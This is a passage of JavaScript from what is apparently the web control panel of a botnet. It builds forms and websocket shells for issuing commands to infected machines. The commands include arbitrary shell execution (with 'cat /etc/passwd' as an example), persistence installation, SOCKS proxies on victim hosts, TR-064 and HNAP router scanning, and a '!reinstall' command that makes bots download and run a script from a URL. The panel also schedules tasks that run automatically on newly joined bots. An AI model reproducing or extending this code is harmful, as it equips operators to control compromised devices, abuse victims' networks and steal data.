    '</select>' +
    '</div>' +
    '<div class="cmd-group" id="socks-m-port-row">' +
    '<label>Listen Port</label>' +
    '<input type="text" id="socks-m-port" value="1080" placeholder="1080">' +
    '</div>' +
    '<div class="cmd-group" id="socks-m-relay-row" style="display:none">' +
    '<label>Relay</label>' +
    '<select id="socks-m-relay"><option value="">Loading...</option></select>' +
    '</div>' +
    '<div class="cmd-group">' +
    '<label>Username (optional)</label>' +
    '<input type="text" id="socks-m-user" value="' + escHtml(defUser) + '" placeholder="username">' +
    '</div>' +
    '<div class="cmd-group">' +
    '<label>Password (optional)</label>' +
    '<input type="password" id="socks-m-pass" value="' + escHtml(defPass) + '" placeholder="password">' +
    '</div>' +
    '</div>' +
    '<div class="socks-modal-btns">' +
    '<button class="socks-modal-btn socks-modal-cancel" onclick="closeSocksModal()">Cancel</button>' +
    '<button class="socks-modal-btn socks-modal-start" onclick="submitSocksModal()">Start</button>' +
    '</div>' +
    '</div>';
  overlay.setAttribute('data-bot', botID);
  document.body.appendChild(overlay);

  // Close on overlay click
  overlay.addEventListener('click', function (e) {
    if (e.target === overlay) closeSocksModal();
  });

  // Fetch relays for dropdown
  fetch('/api/relays').then(function (r) { return r.json(); }).then(function (relays) {
    var sel = document.getElementById('socks-m-relay');
    if (!sel) return;
    sel.innerHTML = '';
    if (!relays || !relays.length) {
      sel.innerHTML = '<option value="">No relays configured</option>';
      return;
    }
    relays.forEach(function (r) {
      var opt = document.createElement('option');
      opt.value = r.host + ':' + r.controlPort;
      opt.textContent = r.name + ' (' + r.host + ':' + r.controlPort + ')';
      sel.appendChild(opt);
    });
  }).catch(function () {
    var sel = document.getElementById('socks-m-relay');
    if (sel) sel.innerHTML = '<option value="">Failed to load relays</option>';
  });

  requestAnimationFrame(function () { overlay.classList.add('open'); });
}

function socksModalModeChange() {
  var mode = document.getElementById('socks-m-mode').value;
  document.getElementById('socks-m-port-row').style.display = mode === 'direct' ? '' : 'none';
  document.getElementById('socks-m-relay-row').style.display = mode === 'relay' ? '' : 'none';
}

function closeSocksModal() {
  var el = document.getElementById('socks-modal-overlay');
  if (el) { el.classList.remove('open'); setTimeout(function () { el.remove(); }, 200); }
}

function submitSocksModal() {
  var overlay = document.getElementById('socks-modal-overlay');
  if (!overlay) return;
  var botID = overlay.getAttribute('data-bot');
  var mode = document.getElementById('socks-m-mode').value;
  var user = (document.getElementById('socks-m-user') || {}).value || '';
  var pass = (document.getElementById('socks-m-pass') || {}).value || '';

  if (mode === 'relay') {
    var relay = (document.getElementById('socks-m-relay') || {}).value;
    if (!relay) { showToast('No relay selected', false); return; }
    popupCmd(botID, '!socks ' + relay);
  } else {
    var port = (document.getElementById('socks-m-port') || {}).value || '1080';
    popupCmd(botID, '!socks ' + port);
  }
  if (user && pass) popupCmd(botID, '!socksauth ' + user + ' ' + pass);
  closeSocksModal();
}

// ---------------------------------------------------------------------------
// Command Center
// ---------------------------------------------------------------------------

var cmdArgDefs = {
  '!shell': [{ id: 'arg-shell-cmd', label: 'Command', placeholder: 'e.g. whoami, ls -la, cat /etc/passwd' }],
  '!detach': [{ id: 'arg-detach-cmd', label: 'Command', placeholder: 'e.g. nohup ./payload &' }],
  '!socks': [
    {
      id: 'arg-socks-mode', label: 'Mode', type: 'select', options: [
        { v: 'direct', t: 'Direct (listen on bot)' },
        { v: 'relay', t: 'Relay (backconnect)' }
      ]
    },
    { id: 'arg-socks-port', label: 'Listen Port', placeholder: 'e.g. 1080 (default)', showWhen: { field: 'arg-socks-mode', val: 'direct' } },
    { id: 'arg-socks-relay', label: 'Relay', type: 'select', options: [], showWhen: { field: 'arg-socks-mode', val: 'relay' } },
    { id: 'arg-socks-user', label: 'Auth Username (optional)', placeholder: typeof DEFAULT_PROXY_USER !== 'undefined' ? DEFAULT_PROXY_USER : '' },
    { id: 'arg-socks-pass', label: 'Auth Password (optional)', placeholder: typeof DEFAULT_PROXY_PASS !== 'undefined' ? DEFAULT_PROXY_PASS : '', type: 'password' }
  ],
  '!stopsocks': [],
  '!socksauth': [
    { id: 'arg-sa-user', label: 'Username', placeholder: 'socks username' },
    { id: 'arg-sa-pass', label: 'Password', placeholder: 'socks password', type: 'password' }
  ],
  '!info': [], '!persist': [],
  '!scan': [{ id: 'arg-scan-addr', label: 'Scan Server', placeholder: 'host:port (e.g. 1.2.3.4:48290)' }],
  '!stopscan': [],
  '!tr064': [], '!stoptr064': [],
  '!hnap': [], '!stophnap': [],
  '!reinstall': [{ id: 'arg-reinstall-url', label: 'Script URL', placeholder: 'e.g. http://example.com/x.sh' }],
  '!lolnogtfo': []
};

function updateArgFields() {
  var typ = document.getElementById('cmd-type').value;
  var wrap = document.getElementById('arg-fields');
  var defs = cmdArgDefs[typ] || [];
  if (!defs.length) { wrap.innerHTML = ''; return; }
  var html = '';
  defs.forEach(function (d) {
    var vis = d.showWhen ? 'display:none' : '';
    html += '<div class="cmd-group" id="grp-' + d.id + '" style="' + vis + '"><label>' + d.label + '</label>';
    if (d.type === 'select') {
      html += '<select id="' + d.id + '" onchange="updateConditionalFields()">';
      d.options.forEach(function (o) { html += '<option value="' + o.v + '">' + o.t + '</option>'; });
      html += '</select>';
    } else {
      html += '<input type="' + (d.type === 'password' ? 'password' : 'text') + '" id="' + d.id + '" placeholder="' + (d.placeholder || '') + '">';
    }
    html += '</div>';
  });
  wrap.innerHTML = html;
  updateConditionalFields();
  // Populate relay dropdown if socks command
  if (typ === '!socks') { populateRelayDropdown(); }
}

function updateConditionalFields() {
  var typ = document.getElementById('cmd-type').value;
  (cmdArgDefs[typ] || []).forEach(function (d) {
    if (!d.showWhen) return;
    var el = document.getElementById(d.showWhen.field);
    var grp = document.getElementById('grp-' + d.id);
    if (el && grp) { grp.style.display = (el.value === d.showWhen.val) ? '' : 'none'; }
  });
}

function buildArgs() {
  var typ = document.getElementById('cmd-type').value;
  switch (typ) {
    case '!shell': return (document.getElementById('arg-shell-cmd') || {}).value || '';
    case '!detach': return (document.getElementById('arg-detach-cmd') || {}).value || '';
    case '!socks':
      var mode = (document.getElementById('arg-socks-mode') || {}).value || 'direct';
      if (mode === 'relay') {
        return (document.getElementById('arg-socks-relay') || {}).value || '';
      }
      return (document.getElementById('arg-socks-port') || {}).value || '';
    case '!socksauth':
      var u = (document.getElementById('arg-sa-user') || {}).value || '';
      var p = (document.getElementById('arg-sa-pass') || {}).value || '';
      return (u && p) ? u + ' ' + p : '';
    case '!reinstall': return (document.getElementById('arg-reinstall-url') || {}).value || '';
    case '!scan': return (document.getElementById('arg-scan-addr') || {}).value || '';
    default: return '';
  }
}

function sendCmd() {
  var typ = document.getElementById('cmd-type').value;
  var args = buildArgs().trim();
  var botID = document.getElementById('cmd-bot').value.trim();
  if ((typ === '!shell' || typ === '!detach') && !args) { showToast('Please enter a command', false); return; }
  if (typ === '!reinstall' && !args) { showToast('Please enter a script URL', false); return; }
  if (typ === '!socksauth') {
    var u = (document.getElementById('arg-sa-user') || {}).value || '';
    var p = (document.getElementById('arg-sa-pass') || {}).value || '';
    if (!u || !p) { showToast('Username and password required', false); return; }
  }

  if (typ === '!lolnogtfo' && !confirm('Kill all targeted bots? This cannot be undone.')) return;
  if (typ === '!reinstall' && !confirm('Run reinstall script on all targeted bots?')) return;
  var command = typ;
  if (args) command += ' ' + args;
  fetch('/api/command', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ command: command, botID: botID }) })
    .then(function (r) { return r.json(); }).then(function (d) {
      showToast(d.message, d.success);
      // If !socks command, also send !socksauth if creds provided
      if (typ === '!socks' && d.success) {
        var su = (document.getElementById('arg-socks-user') || {}).value || '';
        var sp = (document.getElementById('arg-socks-pass') || {}).value || '';
        if (su && sp) {
          fetch('/api/command', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ command: '!socksauth ' + su + ' ' + sp, botID: botID }) });
        }
      }
    })
    .catch(function () { showToast('Request failed', false); });
}

// ---------------------------------------------------------------------------
// SOCKS Dashboard
// ---------------------------------------------------------------------------

function renderSocksDash() {
  if (!window._botsArr) return;
  var bots = window._botsArr;
  var active = bots.filter(function (b) { return b.socksActive; });
  var tabCount = document.getElementById('tab-socks-count');
  if (tabCount) tabCount.textContent = active.length;
  document.getElementById('socks-active').textContent = active.length;
  document.getElementById('socks-total').textContent = bots.length;
  var wrap = document.getElementById('socks-dash-wrap');
  if (!active.length) { wrap.innerHTML = '<div class="no-bots">No active SOCKS proxies</div>'; return; }
  var html = '<table class="socks-dash-table"><thead><tr><th>Bot ID</th><th>IP</th><th>Country</th><th>Port</th><th>Auth</th><th>Running Since</th><th></th></tr></thead><tbody>';
  active.forEach(function (b) {
    var id = b.botID.replace(/'/g, "\\'");
    html += '<tr><td style="color:var(--blue);font-family:monospace">' + escHtml(b.botID) + '</td>' +
      '<td style="font-family:monospace">' + escHtml(b.ip) + '</td>' +
      '<td><span class="country-badge">' + escHtml(b.country) + '</span></td>' +
      '<td style="color:var(--accent);font-family:monospace">' + (b.socksRelay || '-') + '</td>' +
      '<td>' + (b.socksUser || '<span style="color:var(--text-dim)">none</span>') + '</td>' +
      '<td>' + (b.socksStarted ? ago(b.socksStarted) : '-') + '</td>' +
      '<td><button class="socks-stop-btn" onclick="popupCmd(\'' + id + '\',\'!stopsocks\')">Stop</button></td></tr>';
  });
  wrap.innerHTML = html + '</tbody></table>';
}



// ---------------------------------------------------------------------------
// Relay Management
// ---------------------------------------------------------------------------

var _relaysCache = [];

function populateRelayDropdown() {
  fetch('/api/relays').then(function (r) { return r.json(); }).then(function (relays) {
    _relaysCache = relays || [];
    var sel = document.getElementById('arg-socks-relay');
    if (!sel) return;
    sel.innerHTML = '';
    if (!relays.length) {
      sel.innerHTML = '<option value="">No relays configured</option>';
      return;
    }
    relays.forEach(function (r) {
      var opt = document.createElement('option');
      opt.value = r.host + ':' + r.controlPort;
      opt.textContent = r.name + ' (' + r.host + ':' + r.controlPort + ')';
      sel.appendChild(opt);
    });
  }).catch(function () { });
}

function loadRelays() {}
function loadRelayAPIStatus() {}
function loadRelayStats() {}

function humanBytes(b) {
  if (b < 1024) return b + ' B';
  if (b < 1048576) return (b / 1024).toFixed(1) + ' KB';
  if (b < 1073741824) return (b / 1048576).toFixed(1) + ' MB';
  return (b / 1073741824).toFixed(2) + ' GB';
}

// ---------------------------------------------------------------------------
// Activity Feed
// ---------------------------------------------------------------------------

var lastActivityLen = 0;
var activityTypeFilter = 'all';

function addActivityEntry(entry) {
  var al = document.getElementById('activity-list');
  var placeholder = al.querySelector('.no-bots'); if (placeholder) placeholder.remove();
  var div = document.createElement('div'); div.className = 'activity-entry';
  div.setAttribute('data-type', entry.type);
  div.innerHTML = '<span class="activity-time">' + escHtml(entry.time) + '</span>' +
    '<span class="activity-type ' + escHtml(entry.type) + '">' + escHtml(entry.type) + '</span>' +
    '<span class="activity-msg">' + escHtml(entry.message) + '</span>';
  al.appendChild(div);
  var entries = al.querySelectorAll('.activity-entry');
  if (entries.length > 500) entries[0].remove();
  filterActivity();
  addNotification(entry.time, entry.type + ': ' + entry.message);
}

function renderActivityFull(entries) {
  if (!entries || !entries.length) return;
  var al = document.getElementById('activity-list');
  al.innerHTML = entries.map(function (e) {
    return '<div class="activity-entry" data-type="' + escHtml(e.type) + '"><span class="activity-time">' + escHtml(e.time) + '</span>' +
      '<span class="activity-type ' + escHtml(e.type) + '">' + escHtml(e.type) + '</span>' +
      '<span class="activity-msg">' + escHtml(e.message) + '</span></div>';
  }).join('');
  if (entries.length > lastActivityLen) {
    entries.slice(lastActivityLen).forEach(function (e) { addNotification(e.time, e.type + ': ' + e.message); });
  }
  lastActivityLen = entries.length;
  filterActivity();
}

function toggleActivityFilter(el) {
  document.querySelectorAll('.activity-filter-chip').forEach(function (c) { c.classList.remove('active'); });
  el.classList.add('active');
  activityTypeFilter = el.getAttribute('data-type');
  filterActivity();
}

function filterActivity() {
  var q = (document.getElementById('activity-search') || {}).value || '';
  q = q.toLowerCase();
  var entries = document.querySelectorAll('#activity-list .activity-entry');
  var shown = 0;
  entries.forEach(function (e) {
    var type = (e.getAttribute('data-type') || '').toLowerCase();
    var typeMatch = activityTypeFilter === 'all' || type === activityTypeFilter;
    var textMatch = !q || e.textContent.toLowerCase().indexOf(q) !== -1;
    if (typeMatch && textMatch) { e.style.display = ''; shown++; }
    else { e.style.display = 'none'; }
  });
  var countEl = document.getElementById('activity-count');
  if (countEl) {
    if (q || activityTypeFilter !== 'all') { countEl.textContent = shown + '/' + entries.length; }
    else { countEl.textContent = entries.length ? entries.length + ' events' : ''; }
  }
}

function clearActivity() {
  document.getElementById('activity-list').innerHTML = '<div class="no-bots">No activity yet</div>';
  var countEl = document.getElementById('activity-count');
  if (countEl) countEl.textContent = '';
}

// ---------------------------------------------------------------------------
// Task Management
// ---------------------------------------------------------------------------

function updateTaskArgFields() {
  var typ = document.getElementById('task-type').value;
  var wrap = document.getElementById('task-arg-fields');
  var defs = cmdArgDefs[typ] || [];
  if (!defs.length) { wrap.innerHTML = ''; return; }
  var html = '';
  defs.forEach(function (d) {
    var vis = d.showWhen ? 'display:none' : '';
    html += '<div class="cmd-group" id="tgrp-' + d.id + '" style="' + vis + '"><label>' + d.label + '</label>';
    if (d.type === 'select') {
      html += '<select id="t-' + d.id + '" onchange="updateTaskConditionalFields()">';
      d.options.forEach(function (o) { html += '<option value="' + o.v + '">' + o.t + '</option>'; });
      html += '</select>';
    } else {
      html += '<input type="' + (d.type === 'password' ? 'password' : 'text') + '" id="t-' + d.id + '" placeholder="' + (d.placeholder || '') + '">';
    }
    html += '</div>';
  });
  wrap.innerHTML = html;
  updateTaskConditionalFields();
  if (typ === '!socks') { populateTaskRelayDropdown(); }
}

function updateTaskConditionalFields() {
  var typ = document.getElementById('task-type').value;
  (cmdArgDefs[typ] || []).forEach(function (d) {
    if (!d.showWhen) return;
    var el = document.getElementById('t-' + d.showWhen.field);
    var grp = document.getElementById('tgrp-' + d.id);
    if (el && grp) { grp.style.display = (el.value === d.showWhen.val) ? '' : 'none'; }
  });
}

function populateTaskRelayDropdown() {
  fetch('/api/relays').then(function (r) { return r.json(); }).then(function (relays) {
    var sel = document.getElementById('t-arg-socks-relay');
    if (!sel) return;
    sel.innerHTML = '';
    if (!relays || !relays.length) {
      sel.innerHTML = '<option value="">No relays configured</option>';
      return;
    }
    relays.forEach(function (r) {
      var opt = document.createElement('option');
      opt.value = r.host + ':' + r.controlPort;
      opt.textContent = r.name + ' (' + r.host + ':' + r.controlPort + ')';
      sel.appendChild(opt);
    });
  }).catch(function () { });
}

function buildTaskCommand() {
  var typ = document.getElementById('task-type').value;
  var args = '';
  switch (typ) {
    case '!shell': args = (document.getElementById('t-arg-shell-cmd') || {}).value || ''; break;
    case '!detach': args = (document.getElementById('t-arg-detach-cmd') || {}).value || ''; break;
    case '!socks':
      var mode = (document.getElementById('t-arg-socks-mode') || {}).value || 'direct';
      if (mode === 'relay') { args = (document.getElementById('t-arg-socks-relay') || {}).value || ''; }
      else { args = (document.getElementById('t-arg-socks-port') || {}).value || ''; }
      break;
    case '!socksauth':
      var u = (document.getElementById('t-arg-sa-user') || {}).value || '';
      var p = (document.getElementById('t-arg-sa-pass') || {}).value || '';
      if (u && p) args = u + ' ' + p;
      break;
    case '!scan': args = (document.getElementById('t-arg-scan-addr') || {}).value || ''; break;
    default: break;
  }
  var cmd = typ;
  if (args.trim()) cmd += ' ' + args.trim();
  return cmd;
}

function loadTasks() {
  fetch('/api/tasks').then(function (r) { return r.json(); }).then(function (tasks) {
    renderTaskTable(tasks);
  }).catch(function () { });
}

function renderTaskTable(tasks) {
  var wrap = document.getElementById('task-table-wrap');
  if (!wrap) return;
  var active = tasks.filter(function (t) { return !t.expired; });
  var tabCount = document.getElementById('tab-tasks-count');
  if (tabCount) tabCount.textContent = active.length;
  if (!tasks || !tasks.length) {
    wrap.innerHTML = '<div class="no-bots">No active tasks. Use the bar above to add one.</div>';
    return;
  }
  var html = '<table class="socks-dash-table"><thead><tr><th>Command</th><th>Mode</th><th>Created</th><th>Expires</th><th>Executed</th><th>Status</th><th></th></tr></thead><tbody>';
  tasks.forEach(function (t) {
    var mode = t.runOnce ? '<span style="color:var(--accent)">Run Once</span>' : '<span style="color:var(--blue)">Every Join</span>';
    var created = new Date(t.createdAt);
    var createdStr = ('0' + created.getHours()).slice(-2) + ':' + ('0' + created.getMinutes()).slice(-2) + ':' + ('0' + created.getSeconds()).slice(-2);
    var expiresStr = t.expiresAt ? ago(t.expiresAt) : '<span style="color:var(--text-dim)">never</span>';
    if (t.expiresAt && !t.expired) {
      var exp = new Date(t.expiresAt);
      var remaining = Math.max(0, Math.floor((exp - Date.now()) / 1000));
      if (remaining > 3600) expiresStr = Math.floor(remaining / 3600) + 'h ' + Math.floor((remaining % 3600) / 60) + 'm';
      else if (remaining > 60) expiresStr = Math.floor(remaining / 60) + 'm ' + (remaining % 60) + 's';
      else expiresStr = remaining + 's';
    }
    var status = t.expired ? '<span style="color:var(--text-dim)">expired</span>' : '<span style="color:var(--green)">active</span>';
    html += '<tr' + (t.expired ? ' style="opacity:0.5"' : '') + '><td style="font-family:monospace;color:var(--blue)">' + escHtml(t.command) + '</td>' +
      '<td>' + mode + '</td>' +
      '<td>' + createdStr + '</td>' +
      '<td>' + expiresStr + '</td>' +
      '<td>' + t.executed + ' bots</td>' +
      '<td>' + status + '</td>' +
      '<td><button class="socks-stop-btn" onclick="deleteTask(\'' + escHtml(t.id) + '\')">Remove</button></td></tr>';
  });
  wrap.innerHTML = html + '</tbody></table>';
}

function addTask() {
  var command = buildTaskCommand();
  var typ = document.getElementById('task-type').value;
  if ((typ === '!shell' || typ === '!detach') && command === typ) { showToast('Please enter a command', false); return; }
  if (typ === '!socksauth') {
    var u = (document.getElementById('t-arg-sa-user') || {}).value || '';
    var p = (document.getElementById('t-arg-sa-pass') || {}).value || '';
    if (!u || !p) { showToast('Username and password required', false); return; }
  }
  var duration = parseInt((document.getElementById('task-duration') || {}).value) || 0;
  var runOnce = (document.getElementById('task-runonce') || {}).checked || false;
  fetch('/api/tasks', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ command: command, duration: duration, runOnce: runOnce })
  }).then(function (r) { return r.json(); }).then(function (d) {
    if (d.success) {
      showToast('Task created: ' + command, true);
      document.getElementById('task-duration').value = '0';
      document.getElementById('task-runonce').checked = false;
      updateTaskArgFields();
      loadTasks();
    } else {
      showToast(d.error || 'Failed to create task', false);
    }
  }).catch(function () { showToast('Request failed', false); });
}

function deleteTask(id) {
  if (!confirm('Remove this task?')) return;
  fetch('/api/tasks?id=' + encodeURIComponent(id), { method: 'DELETE' })
    .then(function (r) { return r.json(); })
    .then(function (d) {
      showToast(d.success ? 'Task removed' : (d.error || 'Failed'), d.success !== false);
      loadTasks();
    }).catch(function () { showToast('Request failed', false); });
}

// ---------------------------------------------------------------------------
// Notification Drawer
// ---------------------------------------------------------------------------

var notifHistory = [], notifUnseen = 0;

function addNotification(time, msg) {
  notifHistory.push({ time: time, msg: msg });
  if (notifHistory.length > 50) notifHistory = notifHistory.slice(-50);
  notifUnseen++; updateNotifBadge(); renderNotifList();
  lsSet('notifs', notifHistory);
}

function updateNotifBadge() {
  var b = document.getElementById('notif-badge');
  if (notifUnseen > 0) { b.style.display = 'flex'; b.textContent = notifUnseen > 99 ? '99+' : notifUnseen; }
  else { b.style.display = 'none'; }
}

// ---------------------------------------------------------------------------
// Tab switching
// ---------------------------------------------------------------------------

function switchTab(btn) {
  document.querySelectorAll('.tab').forEach(function (t) { t.classList.remove('active'); });
  document.querySelectorAll('.tab-panel').forEach(function (p) { p.classList.remove('active'); });
  btn.classList.add('active');
  var panel = document.getElementById(btn.getAttribute('data-tab'));
  if (panel) panel.classList.add('active');
  lsSet('tab', btn.getAttribute('data-tab'));
}

function toggleNotifs() {
  var d = document.getElementById('notif-drawer');
  if (d.classList.contains('open')) { d.classList.remove('open'); }
  else { d.classList.add('open'); notifUnseen = 0; updateNotifBadge(); }
}

function renderNotifList() {
  var nl = document.getElementById('notif-list');
  if (!notifHistory.length) { nl.innerHTML = '<div class="notif-empty">No notifications yet</div>'; return; }
  nl.innerHTML = notifHistory.map(function (n) {
    return '<div class="notif-entry"><div class="notif-time">' + escHtml(n.time) + '</div><div class="notif-msg">' + escHtml(n.msg) + '</div></div>';
  }).reverse().join('');
}

// ---------------------------------------------------------------------------
// Shell Modal — Enhanced with file browser, breadcrumb, tab completion,
// bot info sidebar, multi-tab, copy output, net scan, socks button
// ---------------------------------------------------------------------------

var shellWS = null, shellHistory = [], shellHistIdx = -1, shellBotID = '', shellCwd = '~';
var shellSessions = {};
var shellTabs = []; // [{botID, ws, output, cmds, cwd}]
var activeShellTab = 0;
var pendingFileRefresh = false;

// Tab completion definitions
var tcCommands = [
  { cmd: '!shell', desc: 'Execute shell command' },
  { cmd: '!detach', desc: 'Background exec (no output)' },
  { cmd: '!stream', desc: 'Streaming exec (real-time)' },
  { cmd: '!socks', desc: 'Start SOCKS proxy' },
  { cmd: '!stopsocks', desc: 'Stop SOCKS proxy' },
  { cmd: '!socksauth', desc: 'Set SOCKS credentials' },
  { cmd: '!info', desc: 'System information' },
  { cmd: '!persist', desc: 'Install persistence' },
  { cmd: '!kill', desc: 'Self-destruct' }
];
var tcIdx = -1, tcMatches = [];

function openShell(botID) {
  closeShell();
  shellTabs = [{ botID: botID }];
  activeShellTab = 0;
  activateShellTab(0);
}

function addShellTab(botID) {
  // Check if tab already exists
  for (var i = 0; i < shellTabs.length; i++) {
    if (shellTabs[i].botID === botID) { switchShellTab(i); return; }
  }
  shellTabs.push({ botID: botID });
  switchShellTab(shellTabs.length - 1);
}

function activateShellTab(idx) {
  var tab = shellTabs[idx];
  if (!tab) return;
  shellBotID = tab.botID;
  activeShellTab = idx;

  var overlay = document.getElementById('shell-overlay');
  var output = document.getElementById('shell-output');
  var input = document.getElementById('shell-input');
  document.getElementById('shell-title').textContent = 'Shell: ' + tab.botID;

  // Bot info in header meta
  var b = window._bots && window._bots[tab.botID];
  var meta = document.getElementById('shell-meta');
  if (b) {
    var socksTag = b.socksActive
      ? '<span style="color:var(--green)">SOCKS: <b>ON</b></span>'
      : '<span style="color:var(--text-dim)">SOCKS: OFF</span>';
    meta.innerHTML = '<span><b>' + escHtml(b.ip) + '</b></span>' +
      '<span>Arch: <b>' + escHtml(b.arch) + '</b></span>' + socksTag;
  } else { meta.innerHTML = ''; }

  // Bot info sidebar
  renderInfoSidebar(b);

  // Restore session
  var saved = shellSessions[tab.botID];
  if (saved) {
    output.innerHTML = saved.output;
    shellHistory = saved.cmds.slice();
    shellCwd = saved.cwd || '~';
    output.scrollTop = output.scrollHeight;
  } else {
    output.innerHTML = '';
    shellHistory = [];
    shellCwd = '~';
  }

  updateBreadcrumb();
  document.getElementById('shell-prompt').textContent = shellCwd + '$ ';
  shellHistIdx = shellHistory.length;
  renderShellTabs();
  overlay.classList.add('open');
  input.focus();

  // Connect WebSocket
  if (shellWS) { shellWS.close(); shellWS = null; }
  var proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
  shellWS = new WebSocket(proto + '//' + location.host + '/ws/shell?botID=' + encodeURIComponent(tab.botID));
  shellWS.onmessage = function (e) {
    try {
      var d = JSON.parse(e.data);
      if (d.output) {
        appendOutput(d.output);
        // If we requested a file listing, parse it
        if (pendingFileRefresh) {
          pendingFileRefresh = false;
          parseFileList(d.output);
        }
        // Check if output is a pwd result (single line starting with /)
        var trimmed = d.output.trim();
        if (trimmed.match(/^\/[^\n]*$/) && !trimmed.match(/\s/)) {
          shellCwd = trimmed;
          document.getElementById('shell-prompt').textContent = shellCwd + '$ ';
          updateBreadcrumb();
        }
      }
    } catch (ex) { }
  };
  shellWS.onclose = function () { appendOutput('\n[Connection closed]\n'); };

  // Auto-refresh file listing
  setTimeout(function () { refreshFiles(); }, 500);
}

function switchShellTab(idx) {
  if (idx === activeShellTab && shellTabs.length > 0) return;
  // Save current state
  if (shellBotID) {
    shellSessions[shellBotID] = {
      output: document.getElementById('shell-output').innerHTML,
      cmds: shellHistory.slice(), cwd: shellCwd
    };
  }
  activateShellTab(idx);
}

function closeShellTab(idx) {
  if (shellTabs.length <= 1) { closeShell(); return; }
  var tab = shellTabs[idx];
  if (tab.botID === shellBotID && shellWS) { shellWS.close(); shellWS = null; }
  shellTabs.splice(idx, 1);
  if (activeShellTab >= shellTabs.length) activeShellTab = shellTabs.length - 1;
  activateShellTab(activeShellTab);
}

function renderShellTabs() {
  var wrap = document.getElementById('shell-tabs');
  if (shellTabs.length <= 1) { wrap.innerHTML = ''; return; }
  wrap.innerHTML = shellTabs.map(function (t, i) {
    var cls = i === activeShellTab ? 'shell-tab active' : 'shell-tab';
    var id = t.botID.length > 10 ? t.botID.substring(0, 10) + '..' : t.botID;
    return '<span class="' + cls + '" onclick="switchShellTab(' + i + ')">' + escHtml(id) +
      '<span class="shell-tab-close" onclick="event.stopPropagation();closeShellTab(' + i + ')">&times;</span></span>';
  }).join('');
}

function closeShell() {
  if (shellBotID) {
    shellSessions[shellBotID] = {
      output: document.getElementById('shell-output').innerHTML,
      cmds: shellHistory.slice(), cwd: shellCwd
    };
  }
  document.getElementById('shell-overlay').classList.remove('open');
  if (shellWS) { shellWS.close(); shellWS = null; }
  shellTabs = [];
  document.getElementById('tab-complete').style.display = 'none';
}

function parseAnsi(text) {
  var frag = document.createDocumentFragment();
  var state = { bold: false, italic: false, underline: false, fg: null, bg: null };
  var re = /\x1b\[([0-9;]*)([A-Za-z])/g;
  var lastIndex = 0, match;
  function flush(str) {
    if (!str) return;
    var span = document.createElement('span');
    span.textContent = str;
    var cls = [];
    if (state.bold) cls.push('ansi-bold');
    if (state.italic) cls.push('ansi-italic');
    if (state.underline) cls.push('ansi-underline');
    if (state.fg !== null) cls.push('ansi-fg-' + state.fg);
    if (state.bg !== null) cls.push('ansi-bg-' + state.bg);
    if (cls.length) span.className = cls.join(' ');
    frag.appendChild(span);
  }
  while ((match = re.exec(text)) !== null) {
    flush(text.substring(lastIndex, match.index));
    lastIndex = re.lastIndex;
    if (match[2] !== 'm') continue;
    var codes = match[1] ? match[1].split(';').map(Number) : [0];
    for (var i = 0; i < codes.length; i++) {
      var c = codes[i];
      if (c === 0) { state = { bold: false, italic: false, underline: false, fg: null, bg: null }; }
      else if (c === 1) state.bold = true;
      else if (c === 3) state.italic = true;
      else if (c === 4) state.underline = true;
      else if (c >= 30 && c <= 37) state.fg = c - 30;
      else if (c >= 40 && c <= 47) state.bg = c - 40;
      else if (c >= 90 && c <= 97) state.fg = (c - 90) + 8;
      else if (c >= 100 && c <= 107) state.bg = (c - 100) + 8;
      else if (c === 39) state.fg = null;
      else if (c === 49) state.bg = null;
      else if (c === 22) state.bold = false;
      else if (c === 23) state.italic = false;
      else if (c === 24) state.underline = false;
    }
  }
  flush(text.substring(lastIndex));
  return frag;
}

function appendOutput(text) {
  var el = document.getElementById('shell-output');
  if (text.indexOf('\x1b[') !== -1) {
    el.appendChild(parseAnsi(text));
  } else {
    var span = document.createElement('span');
    span.textContent = text;
    el.appendChild(span);
  }
  el.scrollTop = el.scrollHeight;
}

// ---------------------------------------------------------------------------
// Breadcrumb navigation
// ---------------------------------------------------------------------------

function updateBreadcrumb() {
  var bc = document.getElementById('shell-breadcrumb');
  if (!shellCwd || shellCwd === '~') {
    bc.innerHTML = '<span class="bc-seg bc-current">~</span>';
    return;
  }
  var parts = shellCwd.split('/').filter(function (p) { return p !== ''; });
  var html = '<span class="bc-seg" onclick="shellCd(\'/\')">/</span>';
  for (var i = 0; i < parts.length; i++) {
    html += '<span class="bc-sep">/</span>';
    var path = '/' + parts.slice(0, i + 1).join('/');
    if (i === parts.length - 1) {
      html += '<span class="bc-seg bc-current">' + escHtml(parts[i]) + '</span>';
    } else {
      html += '<span class="bc-seg" onclick="shellCd(\'' + path.replace(/'/g, "\\'") + '\')">' + escHtml(parts[i]) + '</span>';
    }
  }
  bc.innerHTML = html;
}

function shellCd(path) {
  if (!shellWS || shellWS.readyState !== 1) return;
  var cmd = 'cd ' + path;
  var p = document.getElementById('shell-prompt').textContent;
  appendOutput(p + ' ' + cmd + '\n');
  shellWS.send(JSON.stringify({ command: cmd }));
  shellHistory.push(cmd);
  shellHistIdx = shellHistory.length;
  // Refresh files after cd
  setTimeout(function () { refreshFiles(); }, 300);
}

// ---------------------------------------------------------------------------
// File browser
// ---------------------------------------------------------------------------

function refreshFiles() {
  if (!shellWS || shellWS.readyState !== 1) return;
  pendingFileRefresh = true;
  shellWS.send(JSON.stringify({ command: 'ls -laF' }));
}

function parseFileList(output) {
  var wrap = document.getElementById('file-list');
  var lines = output.trim().split('\n');
  var entries = [];

  lines.forEach(function (line) {
    line = line.trim();
    if (!line || line.match(/^total\s/)) return;
    // Parse ls -la output: perms links owner group size month day time name
    var m = line.match(/^([drwxlsStT\-]{10})\s+\S+\s+\S+\s+\S+\s+\S+\s+\S+\s+\S+\s+\S+\s+(.+)$/);
    if (!m) return;
    var perms = m[1], name = m[2];
    var isDir = perms[0] === 'd';
    var isLink = perms[0] === 'l';
    var isExec = !isDir && !isLink && (perms[3] === 'x' || perms[6] === 'x' || perms[9] === 'x');
    // Clean name (remove trailing / or @ or * from ls -F)
    var displayName = name.replace(/[@*\/]$/, '');
    if (name.endsWith('/')) isDir = true;
    if (displayName === '.' || displayName === '..') return;
    // Handle symlinks: name -> target
    if (isLink && displayName.indexOf(' -> ') !== -1) {
      displayName = displayName.split(' -> ')[0];
    }
    entries.push({ name: displayName, isDir: isDir, isLink: isLink, isExec: isExec });
  });

  // Sort: dirs first, then files
  entries.sort(function (a, b) {
    if (a.isDir && !b.isDir) return -1;
